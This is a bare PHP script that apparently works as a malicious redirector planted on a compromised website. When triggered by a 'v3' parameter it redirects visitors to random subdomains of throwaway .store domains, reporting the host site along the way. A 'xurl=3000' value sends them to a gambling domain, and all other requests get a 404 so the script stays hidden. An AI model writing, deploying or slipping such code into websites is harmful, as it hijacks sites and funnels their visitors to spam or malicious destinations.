<?php
if (isset($_GET['v3']) && $_GET['v3'] !== '') {
    $domains = [
        'gadadsdfs.store', 'iobeasto.store', 'jollibekoilop.store', 
        'onesunwithme.store', 'popzeronickkkk.store', 'testdopioi.store', 
        'uipoasto.store', 'zeronickkkk.store', 'golingol.store', 'holipouy.store', 
        'ifkolistaho.store', 'joilopstok.store', 'joliahort.store', 'kiuyilop.store', 
        'koinbeoilop.store', 'molistrojok.store', 'rafffoptik.store', 'sneakkondaho.store'
    ];
    
    $uniqw = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 8);
    $randomDomain = $domains[array_rand($domains)];
    
    $baseURL = "https://{$uniqw}.{$randomDomain}?v1=" . urlencode($_SERVER['HTTP_HOST']);
    $queryString = http_build_query($_GET);
    $redirectURL = $baseURL . '&' . $queryString;

    header("Location: {$redirectURL}", true, 302);
    exit;

} elseif (isset($_GET['xurl']) && $_GET['xurl'] !== '') {
    
    if ($_GET['xurl'] == '3000') {
        $baseURL = "https://compass-gambling.com?v1=" . urlencode($_SERVER['HTTP_HOST']);
        $queryString = http_build_query($_GET);
        $redirectURL = $baseURL . '&' . $queryString;

        header("Location: {$redirectURL}", true, 302);
    } else {
        header("Location: /404", true, 302);
    }
    exit;

} else {
    header("Location: /404", true, 302);
    exit;
}
?>
